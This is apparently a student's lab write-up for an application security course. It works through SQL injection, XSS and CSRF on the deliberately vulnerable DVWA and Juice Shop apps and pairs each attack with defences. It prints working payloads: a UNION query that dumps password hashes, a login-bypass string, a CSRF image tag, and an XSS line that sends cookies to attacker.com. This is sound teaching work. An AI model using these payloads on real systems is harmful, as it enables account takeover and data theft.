# Week 4: Web Application Vulnerabilities

**MSCS Course Mapping:** SE6002 — Application Security

## Objective

Deploy intentionally vulnerable web applications and exploit common web vulnerabilities including SQL injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF). Understanding how these attacks work is essential for both offensive security testing and building secure applications.

## Tools Used

- DVWA (Damn Vulnerable Web Application)
- OWASP Juice Shop
- Docker
- Kali Linux (attack machine)
- Ubuntu Server (hosting vulnerable apps)

## Lab Setup

Deployed both vulnerable applications on the Ubuntu Server using Docker:

```bash
sudo docker run -d -p 80:80 vulnerables/web-dvwa
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
```

DVWA was accessed at `http://192.168.0.89` and Juice Shop at `http://192.168.0.89:3000`. DVWA security level was set to Low to learn the attacks in their simplest form.

## Exploits

### 1. SQL Injection (DVWA)

SQL injection occurs when user input is inserted directly into a database query without sanitization. The application's User ID field was vulnerable, allowing manipulation of the underlying SQL query.

**Basic test** — entering `1' OR '1'='1` in the User ID field returned all users in the database instead of just one. The injected `OR '1'='1'` condition is always true, causing the WHERE clause to match every row.

**Data extraction** — using a UNION-based injection to extract usernames and password hashes from the database:

```
1' UNION SELECT user, password FROM users#
```

This returned all usernames and their MD5 password hashes. The UNION keyword combines results from the original query with a second query targeting the users table. The `#` comments out the rest of the original query to prevent syntax errors.

Users and hashes extracted:

| Username | Password Hash (MD5) |
|----------|-------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

An attacker would take these hashes and crack them with Hashcat (as demonstrated in Week 3). Notice that admin and smithy share the same hash — meaning they use the same password. This is exactly why salting is important.

**How to defend:** Use parameterized queries (prepared statements) that treat user input as data, never as executable SQL. Input validation and web application firewalls provide additional layers of defense.

![SQL Injection](screenshots/sqlinjection.png)

### 2. Cross-Site Scripting — XSS (DVWA)

XSS occurs when an application includes user input in its HTML output without encoding it. This allows an attacker to inject JavaScript that executes in the victim's browser.

Entered the following in the XSS (Reflected) input field:

```html
<script>alert('hacked')</script>
```

The application inserted this directly into the page, and the browser executed the JavaScript, displaying an alert popup.

**Real-world impact:** Instead of a harmless alert, an attacker would inject script to steal session cookies:

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

If a victim clicks a link containing this payload, their session cookie is sent to the attacker, allowing full account takeover without knowing the password.

**How to defend:** Encode all user output (convert `<` to `&lt;`, `>` to `&gt;`), implement Content Security Policy (CSP) headers, and validate input on both client and server side.

![XSS Alert](screenshots/xss.png)

### 3. Cross-Site Request Forgery — CSRF (DVWA)

CSRF exploits the trust a web application has in the user's browser. The DVWA password change function accepts changes via a simple GET request with no verification token.

After changing the password, the full URL was visible in the address bar:

```
http://192.168.0.89/vulnerabilities/csrf/?password_new=HACKED123&password_conf=HACKED123&Change=Change
```

An attacker could embed this URL in a hidden image tag on a malicious website:

```html
<img src="http://target/vulnerabilities/csrf/?password_new=owned&password_conf=owned&Change=Change">
```

If a logged-in user visits the page containing this tag, their browser automatically makes the request using their session cookie. The password changes silently — the victim sees nothing except a broken image.

**How to defend:** Include a unique, unpredictable CSRF token with every state-changing request. The server verifies the token before processing the request. Since the attacker cannot predict the token, they cannot forge a valid request.

![CSRF URL](screenshots/csrf.png)

### 4. SQL Injection — Admin Login (Juice Shop)

Applied the same SQL injection technique to OWASP Juice Shop's login page. Entering `' OR 1=1--` in the email field bypassed authentication entirely.

The injected payload modifies the login query to return all users, and the application logs in as the first result — the admin account (admin@juice-sh.op). The `--` comments out the password check.

This demonstrates that SQL injection is not limited to data extraction — it can bypass authentication completely, granting full administrative access.

![Admin Login](screenshots/admin.png)

### 5. XSS via Search (Juice Shop)

The Juice Shop search function reflects user input into the page without sanitization. Entering an iframe with JavaScript in the search bar triggered code execution:

```html
<iframe src="javascript:alert('xss')">
```

This confirms the same class of vulnerability exists across different applications and frameworks. The search results page rendered the iframe, executing the JavaScript payload.

![Juice Shop XSS](screenshots/xssjuice.png)

## Key Takeaways

- SQL injection can extract entire databases and bypass authentication — a single unvalidated input field can compromise an entire application
- XSS allows attackers to execute code in victims' browsers, enabling session hijacking and account takeover
- CSRF exploits browser trust to perform unauthorized actions on behalf of logged-in users
- These three vulnerabilities are consistently ranked in the OWASP Top 10 and remain among the most common web application flaws
- Defense requires multiple layers: input validation, output encoding, parameterized queries, CSRF tokens, and security headers
- The password hashes extracted via SQL injection could be cracked using the techniques from Week 3, demonstrating how attack chains work in practice

## Next Steps

Week 5 will shift to the defensive side, using vulnerability scanners like Nmap and OpenVAS to systematically identify these types of weaknesses and produce a professional vulnerability assessment report.
